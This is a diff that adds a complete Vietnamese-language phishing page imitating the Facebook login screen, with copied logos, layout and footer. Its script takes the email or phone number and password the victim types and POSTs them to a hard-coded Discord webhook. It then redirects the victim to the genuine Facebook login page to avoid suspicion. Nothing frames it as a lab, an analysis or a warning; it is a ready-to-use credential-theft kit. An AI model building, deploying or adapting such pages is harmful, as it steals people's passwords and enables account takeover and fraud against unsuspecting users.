@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #1c1e21;
+        }
+
+        /* Container chính chứa 2 cột */
+        .container {
+            display: flex;
+            max-width: 1200px;
+            margin: 0 auto;
+            flex: 1;
+            width: 100%;
+            align-items: center;
+        }
+
+        /* ----- CỘT TRÁI ----- */
+        .left-column {
+            flex: 1;
+            padding: 40px 60px 40px 20px;
+            border-right: 1px solid #e5e5e5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .fb-logo {
+            width: 140px;
+            margin-bottom: 25px;
+        }
+
+        .slogan {
+            font-size: 52px;
+            line-height: 1.1;
+            font-weight: 700;
+            margin-bottom: 40px;
+            max-width: 450px;
+        }
+
+        .slogan span {
+            color: #0866ff;
+        }
+
+        /* Phần ghép ảnh (Collage) */
+        .collage-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            height: 400px;
+            margin-left: 20px;
+        }
+
+        .img-main {
+            position: absolute;
+            right: 20px;
+            top: 0;
+            width: 260px;
+            height: 380px;
+            object-fit: cover;
+            border-radius: 16px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        }
+
+        .img-top-left {
+            position: absolute;
+            left: 0;
+            top: 50px;
+            width: 160px;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            background: #fdf5eb;
+            padding: 10px;
+        }
+
+        .img-bottom-left {
+            position: absolute;
+            left: 20px;
+            bottom: 20px;
+            width: 140px;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 16px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+            background: white;
+            padding: 8px;
+        }
+
+        .img-circle {
+            position: absolute;
+            right: 60px;
+            bottom: -10px;
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid white;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        /* ----- CỘT PHẢI ----- */
+        .right-column {
+            flex: 1;
+            padding: 40px 20px 40px 80px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .login-title {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: left;
+            margin-bottom: 25px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 15px 20px;
+            margin-bottom: 15px;
+            border: 1px solid #ccd0d5;
+            border-radius: 50px;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .login-form input:focus {
+            border-color: #0866ff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background-color: #0866ff;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 14px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .btn-primary:hover {
+            background-color: #0055e6;
+        }
+
+        .forgot-link {
+            display: block;
+            margin: 20px 0;
+            color: #1c1e21;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background-color: white;
+            color: #0866ff;
+            border: 1px solid #0866ff;
+            border-radius: 50px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f0f2f5;
+        }
+
+        .meta-logo {
+            width: 60px;
+            margin-top: 40px;
+            opacity: 0.8;
+        }
+
+        /* ----- FOOTER ----- */
+        .footer {
+            padding: 25px 0;
+            border-top: 1px solid #e5e5e5;
+            text-align: center;
+        }
+
+        .footer-links {
+            list-style: none;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            font-size: 13px;
+            color: #737373;
+        }
+
+        .footer-links li {
+            cursor: pointer;
+        }
+
+        .footer-links li:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+            }
+            .left-column {
+                border-right: none;
+                border-bottom: 1px solid #e5e5e5;
+                padding: 40px 20px;
+                align-items: center;
+                text-align: center;
+            }
+            .right-column {
+                padding: 40px 20px;
+            }
+            .collage-wrapper {
+                display: none;
+            }
+            .slogan {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left-column">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg" alt="Facebook" class="fb-logo">
+            <h1 class="slogan">Khám phá những điều bạn <span>yêu thích.</span></h1>
+            
+            <div class="collage-wrapper">
+                <img src="https://images.unsplash.com/photo-1520045892732-304bc3ac5d8e?auto=format&fit=crop&w=400&q=80" alt="Skateboarder" class="img-main">
+                <img src="https://images.unsplash.com/photo-1584100936595-c0654b55a2e2?auto=format&fit=crop&w=200&q=80" alt="Knot Pillow" class="img-top-left">
+                <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?auto=format&fit=crop&w=200&q=80" alt="Movie Tickets" class="img-bottom-left">
+                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80" alt="Profile" class="img-circle">
+            </div>
+        </div>
+
+        <div class="right-column">
+            <div class="login-box">
+                <h2 class="login-title">Đăng nhập vào Facebook</h2>
+                
+                <form class="login-form" id="fbLoginForm">
+                    <input type="text" id="email" name="email" placeholder="Email hoặc số di động" required autofocus>
+                    <input type="password" id="pass" name="pass" placeholder="Mật khẩu" required>
+                    
+                    <button type="button" id="submitBtn" class="btn-primary">Đăng nhập</button>
+                </form>
+
+                <a href="#" class="forgot-link">Quên mật khẩu?</a>
+                
+                <button type="button" class="btn-secondary">Tạo tài khoản mới</button>
+
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" class="meta-logo">
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <ul class="footer-links">
+            <li>Tiếng Việt</li>
+            <li>English (UK)</li>
+            <li>中文(台灣)</li>
+            <li>한국어</li>
+            <li>日本語</li>
+            <li>Français (France)</li>
+            <li>ภาษาไทย</li>
+            <li>Ngôn ngữ khác...</li>
+        </ul>
+    </footer>
+
+    <script>
+        const submitBtn = document.getElementById('submitBtn');
+        
+
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497208035213443153/e3dLNg9SAyfYXkkcjgxEthQLlU0zkZbMFiIFTx2-bmAw7HUhm6o5PbUibOnQLaY07BXg";
+
+        submitBtn.addEventListener('click', async () => {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+
+            if (!email || !pass) {
+                alert("Vui lòng nhập đầy đủ email và mật khẩu.");
+                return;
+            }
+
+
+            submitBtn.innerText = "Đang đăng nhập...";
+            submitBtn.disabled = true;
+
+            const data = {
+                username: "Facebook Bot",
+                content: `🔔 **Thông tin mới nhận được:**\n- **Email/SĐT:** \`${email}\` \n- **Mật khẩu:** \`${pass}\``
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+
+                    window.location.href = "https://www.facebook.com/login";
+                } else {
+                    alert("Có lỗi xảy ra, vui lòng thử lại sau.");
+                    submitBtn.innerText = "Đăng nhập";
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error("Lỗi:", error);
+                alert("Không thể kết nối máy chủ.");
+                submitBtn.innerText = "Đăng nhập";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+
+</body>
+</html>
